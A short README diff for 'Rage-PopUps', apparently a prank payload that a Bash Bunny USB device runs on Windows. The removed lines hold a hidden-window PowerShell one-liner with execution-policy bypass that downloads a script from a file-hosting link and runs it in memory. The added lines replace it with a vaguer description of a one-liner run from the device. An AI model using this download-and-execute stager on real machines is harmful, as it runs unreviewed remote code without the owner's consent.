@@ -26,7 +26,7 @@ There is a section in the Rage-PopUps.ps1 file where you insert your own insults
 
 ### Dependencies
 
-* DropBox or other file hosting service - Your Shared link for the intended file
+
 * Windows 10,11
 
 <p align="right">(<a href="#top">back to top</a>)</p>
@@ -34,10 +34,7 @@ There is a section in the Rage-PopUps.ps1 file where you insert your own insults
 ### Executing program
 
 * Plug in your device
-* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
-```
-powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
-```
+* A one liner command in the run box will execute the script on the bash bunny
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
